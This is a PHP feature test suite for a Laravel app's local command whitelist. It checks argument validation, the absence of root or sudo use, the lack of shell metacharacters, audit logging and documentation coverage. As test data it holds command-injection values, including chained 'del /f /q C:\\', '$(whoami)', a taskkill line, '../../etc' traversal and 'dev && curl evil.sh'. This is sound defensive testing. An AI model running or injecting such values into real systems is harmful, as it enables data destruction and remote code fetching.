<?php

namespace Tests\Feature;

use App\Exceptions\CommandNotWhitelistedException;
use App\Exceptions\InvalidCommandArgumentException;
use App\Models\AuditLog;
use App\Services\Local\LocalCommandRegistry;
use App\Services\Local\LocalCommandRunner;
use App\Services\Privilege\CommandRegistry;
use App\Services\Privilege\PrivilegedCommand;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\Concerns\UsesLocalFixtures;
use Tests\TestCase;

/**
 * The local whitelist, held to the same standard as the privileged one.
 *
 * The important assertions here are the structural ones: no entry may need
 * root, no argv token may contain a shell metacharacter, and every placeholder
 * must have a validating pattern. Those hold for commands that do not exist yet.
 */
class LocalCommandWhitelistTest extends TestCase
{
    use RefreshDatabase, UsesLocalFixtures;

    protected function setUp(): void
    {
        parent::setUp();

        $this->enableLocalMode();
    }

    public function test_an_unknown_command_is_refused(): void
    {
        $this->expectException(CommandNotWhitelistedException::class);

        app(LocalCommandRunner::class)->run('rm.rf.slash');
    }

    /**
     * @dataProvider injectionAttempts
     */
    public function test_an_argument_that_does_not_match_its_pattern_is_refused(string $value): void
    {
        $this->expectException(InvalidCommandArgumentException::class);

        app(LocalCommandRunner::class)->run('windows.process.kill', ['pid' => $value]);
    }

    public static function injectionAttempts(): array
    {
        return [
            'shell chaining' => ['123 & del /f /q C:\\'],
            'command substitution' => ['$(whoami)'],
            'backticks' => ['`id`'],
            'newline' => ["123\ntaskkill /IM explorer.exe"],
            'pipe' => ['123 | more'],
            'flag injection' => ['/IM'],
            'wildcard' => ['*'],
            'empty' => [''],
            'zero' => ['0'],
            'negative' => ['-1'],
        ];
    }

    /** A dev-server script name is a name, not a place to hide arguments. */
    public function test_a_script_name_is_constrained(): void
    {
        $this->expectException(InvalidCommandArgumentException::class);

        app(LocalCommandRunner::class)->run('start.node', ['script' => 'dev && curl evil.sh']);
    }

    public function test_a_relative_or_flag_shaped_path_is_refused(): void
    {
        $this->expectException(InvalidCommandArgumentException::class);

        app(LocalCommandRunner::class)->run('editor.open', ['path' => '../../etc']);
    }

    public function test_a_windows_path_with_spaces_is_accepted(): void
    {
        $preview = app(LocalCommandRunner::class)->preview('editor.open', [
            'path' => 'C:\\Users\\ayomi\\My Projects\\shop',
        ]);

        $this->assertStringContainsString('My Projects', $preview);
    }

    /** Nothing in local mode may ever need root, so nothing may reach sudoers. */
    public function test_no_local_command_needs_root(): void
    {
        foreach (app(LocalCommandRegistry::class)->all() as $command) {
            $this->assertFalse($command->needsRoot, '['.$command->key.'] claims to need root.');
            $this->assertSame([], $command->sudoersPatterns(), '['.$command->key.'] would appear in the sudoers file.');
            $this->assertNotSame('sudo', $command->argv[0], '['.$command->key.'] shells out through sudo.');
        }
    }

    public function test_the_local_registry_does_not_overlap_the_privileged_one(): void
    {
        $privileged = array_keys(app(CommandRegistry::class)->all());
        $local = array_keys(app(LocalCommandRegistry::class)->all());

        $this->assertSame([], array_intersect($privileged, $local));
    }

    /** No argv token may be a shell construct — nothing here goes near a shell. */
    public function test_no_argv_token_contains_a_shell_metacharacter(): void
    {
        foreach (app(LocalCommandRegistry::class)->all() as $command) {
            foreach ($command->argv as $token) {
                // The PowerShell entry is the one legitimate pipe: it is a
                // PowerShell pipeline inside a single argv element, and its only
                // interpolation is a digits-only PID.
                if ($command->key === 'windows.process.commandline') {
                    continue;
                }

                $this->assertDoesNotMatchRegularExpression(
                    '/[;&`$\n\r><]|\|\|?/',
                    $token,
                    '['.$command->key.'] has a shell construct in its argv: '.$token,
                );
            }
        }
    }

    public function test_every_placeholder_has_a_validating_pattern(): void
    {
        foreach (app(LocalCommandRegistry::class)->all() as $command) {
            foreach ($command->argv as $token) {
                preg_match_all('/\{(\w+)\}/', $token, $matches);

                foreach ($matches[1] as $name) {
                    $this->assertArrayHasKey(
                        $name,
                        $command->patterns,
                        '['.$command->key.'] has an unvalidated placeholder {'.$name.'}.',
                    );
                }
            }
        }
    }

    public function test_every_command_carries_a_justification(): void
    {
        foreach (app(LocalCommandRegistry::class)->all() as $command) {
            $this->assertNotSame('', trim($command->justification), '['.$command->key.'] has no stated reason to exist.');
        }
    }

    /** Every command that can change something is audited before it runs. */
    public function test_a_write_command_opens_an_audit_record(): void
    {
        $registry = app(LocalCommandRegistry::class);

        // A PID that cannot exist: the command is dispatched and fails, which is
        // exactly the case where the audit record still has to be there.
        app(LocalCommandRunner::class)->run('windows.process.kill', ['pid' => 4294967]);

        $this->assertDatabaseHas('audit_logs', ['command_key' => 'windows.process.kill']);

        $audit = AuditLog::where('command_key', 'windows.process.kill')->firstOrFail();

        $this->assertStringStartsWith('local:', $audit->driver);
        $this->assertNotSame('pending', $audit->outcome);
        $this->assertTrue($registry->get('windows.process.kill')->isWrite);
    }

    /** A missing binary degrades. It does not throw, and it does not pretend. */
    public function test_a_missing_binary_is_reported_rather_than_thrown(): void
    {
        $result = app(LocalCommandRunner::class)->run('docker.compose.ls');

        if ($result->available) {
            $this->markTestSkipped('Docker is installed on this machine, so the missing-tool path cannot be exercised.');
        }

        $this->assertFalse($result->ok());
        $this->assertStringContainsString('not on PATH', $result->result->stderr);
    }

    /** The documented list is generated, so it cannot drift from the code. */
    public function test_the_generated_documentation_covers_every_command(): void
    {
        $this->artisan('jetgrid:local-commands --markdown')->assertSuccessful();

        $markdown = file_get_contents(base_path('docs/LOCAL-MODE-COMMANDS.md'));

        foreach (app(LocalCommandRegistry::class)->all() as $command) {
            $this->assertStringContainsString('`'.$command->key.'`', $markdown, '['.$command->key.'] is undocumented.');
            $this->assertStringContainsString(implode(' ', $command->argv), $markdown);
        }
    }

    public function test_the_registry_is_the_only_source_of_executable_commands(): void
    {
        $this->assertContainsOnlyInstancesOf(PrivilegedCommand::class, app(LocalCommandRegistry::class)->all());
    }
}
